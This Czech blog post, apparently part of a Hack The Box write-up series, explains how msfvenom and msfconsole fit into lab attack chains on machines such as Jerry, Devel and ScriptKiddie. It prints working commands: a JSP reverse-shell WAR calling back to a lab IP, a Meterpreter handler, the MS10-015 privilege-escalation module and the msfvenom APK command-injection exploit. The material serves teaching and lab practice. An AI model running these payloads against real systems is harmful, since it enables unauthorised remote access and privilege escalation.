---
layout: post
author: Tomáš Matějíček
title: "Metasploit: msfconsole a msfvenom"
date: 2020-11-01
tags: nastroje exploit-framework payloads handlers meterpreter msfconsole msfvenom
---
## Úvod a kontext

Metasploit se v tomto projektu neobjevuje jako univerzální tlačítko "hackni server". Prakticky má tři opakující se role:

- rychle připravit payload přes `msfvenom`,
- dodat handler a session management přes `msfconsole`,
- nebo použít hotový modul tam, kde chyba i cíl přesně odpovídají tomu, co framework už umí.

Na [Jerry](/jerry), [Tabby](/tabby) a [Sealu](/seal) vytváří WAR/JSP payload pro aplikační servery. Na [Develu](/devel) řeší Meterpreter handler i lokální modul pro `MS10-015`. Na [ScriptKiddie](/scriptkiddie) je sám součástí příběhu: nejdřív jako zranitelně obalený `msfvenom`, později jako přímo delegovaný root přes `sudo msfconsole`.

## Co je na Metasploitu v praxi nejdůležitější

Je užitečné oddělit dvě vrstvy:

### `msfvenom`

Slouží hlavně jako generátor payloadů:

- WAR pro Tomcat,
- DLL pro boční načtení,
- EXE nebo jiné spustitelné binárky,
- nebo shellcode pro další exploit.

### `msfconsole`

Slouží jako:

- handler pro reverzní shell nebo Meterpreter,
- katalog exploitů a pomocných modulů,
- a pracovní konzole pro session management.

Praktická hodnota tedy neleží v tom, že by Metasploit "udělal vše". Leží v tom, že zrychlí technickou obsluhu opakujících se kroků.

## Nejčastější scénáře využití v tomto projektu

### Generování payloadu pro známý upload nebo deploy kanál

Na [Jerry](/jerry) je nejčistší scénář velmi přímočarý. Existuje přístup do Tomcat Manageru a je potřeba jen připravit WAR s reverzním shellem:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.4 LPORT=4000 -f war > shell.war
```

Stejný pattern se vrací i na [Tabby](/tabby) a [Sealu](/seal). Tady je důležité, že Metasploit neřeší zranitelnost sama o sobě. Zranitelnost nebo slabá konfigurace už přístup k deployi otevřela. `msfvenom` jen rychle dodá použitelný artefakt pro další krok. Související širší kontext je i v článku [Nebezpečné uploady: polygloty, WAR deploy a plugin upload](/techniky/nebezpecne-uploady-polygloty-war-deploy-a-plugin-upload).

### Handler a lokální exploit navázaný na získanou session

Na [Develu](/devel) je praktická role `msfconsole` jiná. Nejde o první foothold, ale o technické dotažení lokální eskalace, která očekává Meterpreter session:

```text
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
run -j

use exploit/windows/local/ms10_015_kitrap0d
set session 1
run -j
```

Tady je Metasploit praktický hlavně proto, že:

- drží handler,
- spravuje session,
- a umí rovnou navázat lokální modul na už získaný přístup.

Když má framework přesně odpovídající modul a cílový host je starý nebo dobře známý, šetří to čas proti ručnímu skládání celé cesty.

### Použití hotového modulu pro dobře popsanou chybu

Na [ScriptKiddie](/scriptkiddie) je hlavní foothold založený na command injection kolem APK template pro `msfvenom`. Praktický exploit šel pustit rovnou přes existující modul:

```text
use exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection
set lhost 10.10.14.7
set lport 4444
exploit
```

To je důležitý kontrast k situacím, kdy je lepší vlastní skript nebo ruční exploit. Pokud je chyba přesně známá, modul bývá nejrychlejší cesta od validované zranitelnosti k footholdu.

### Rychlá příprava technického doručení

V jiných rozborech Metasploit nehraje hlavní roli, ale řeší mechanickou část řetězce:

- [Buff](/buff) používá `msfvenom` k přípravě shellcode pro buffer overflow,
- [Driver](/driver) generuje DLL pro PrintNightmare,
- [Rope](/rope) rychle skládá shell payload po přepsání toku řízení,
- [Backdoor](/backdoor) nebo [Shibboleth](/shibboleth) využívají `msfvenom` pro rychlou přípravu binárky nebo `.so`.

V těchto případech není Metasploit "mozkem útoku". Je jen velmi efektivní továrna na payload.

## Kdy je Metasploit nejlepší volba

Největší smysl dává tehdy, když:

- existuje přesně odpovídající modul pro známou chybu,
- potřebujete rychle připravit payload běžného typu,
- nebo chcete handler a session management místo vlastního improvizovaného listeneru.

V takových situacích šetří čas a snižuje množství ruční technické práce.

## Co Metasploit neumí vyřešit za vás

Metasploit:

- sám neříká, zda je modul pro daný cíl opravdu vhodný,
- neřeší logiku aplikace ani credential chain,
- a špatně zvolený payload nebo modul může být hlučnější a méně spolehlivý než jednoduchý ruční postup.

Na [Jerry](/jerry) je přínosný proto, že WAR deploy už je otevřený. Na [Develu](/devel) proto, že starý lokální exploit přesně sedí na cílový systém. Na [ScriptKiddie](/scriptkiddie) proto, že modul přesně odpovídá známé command injection. Bez tohohle kontextu by framework sám o sobě útok nevyřešil.

## Nejčastější chyby při použití

### Přehnaná důvěra ve framework místo čtení cíle

To, že modul existuje, ještě neznamená, že je nejlepší volba. Praktická chyba je začít od Metasploitu místo od pochopení řetězce.

### Záměna `msfvenom` za exploit

`msfvenom` jen generuje payload. Neobchází autentizaci, neotevírá upload kanál ani nevynucuje spuštění. Tyhle kroky musí vyřešit zbytek útoku.

### Delegace práv k `msfconsole`

[ScriptKiddie](/scriptkiddie) je velmi dobrá připomínka, že `sudo msfconsole` není omezené oprávnění. Je to v praxi téměř přímý root.

## Nejčastější praktické scénáře

### Mám upload nebo deploy kanál a potřebuji rychle připravit spustitelný payload

To je [Jerry](/jerry), [Tabby](/tabby) nebo [Seal](/seal).

### Mám známý starý lokální exploit a potřebuji handler i session management

To je [Devel](/devel).

### Existuje přesně sedící exploit modul a vlastní skript by nic nepřinesl

To je [ScriptKiddie](/scriptkiddie).

## Související články v projektu

- Rozbory: [Jerry](/jerry), [Devel](/devel), [ScriptKiddie](/scriptkiddie), [Buff](/buff), [Seal](/seal), [Tabby](/tabby), [Driver](/driver), [Rope](/rope)
- Techniky: [Nebezpečné uploady: polygloty, WAR deploy a plugin upload](/techniky/nebezpecne-uploady-polygloty-war-deploy-a-plugin-upload), [Windows lokální privesc přes služby, drivery a spooler](/techniky/windows-lokalni-privesc-pres-sluzby-drivery-a-spooler), [Legacy infrastruktura, kde banner prakticky rozhodne exploit](/techniky/legacy-infrastruktura-kde-banner-prakticky-rozhodne-exploit)

## Co si odnést do praxe

- Metasploit je v praxi nejcennější jako rychlý generátor payloadů, handler a katalog hotových modulů pro přesně známé situace.
- Největší hodnotu má tehdy, když už je jasné, proč právě ten modul nebo payload odpovídá konkrétnímu cíli.
- `msfvenom` není exploit a `msfconsole` není neškodná konzole. Obojí má velký praktický dopad až ve správném kontextu řetězce.
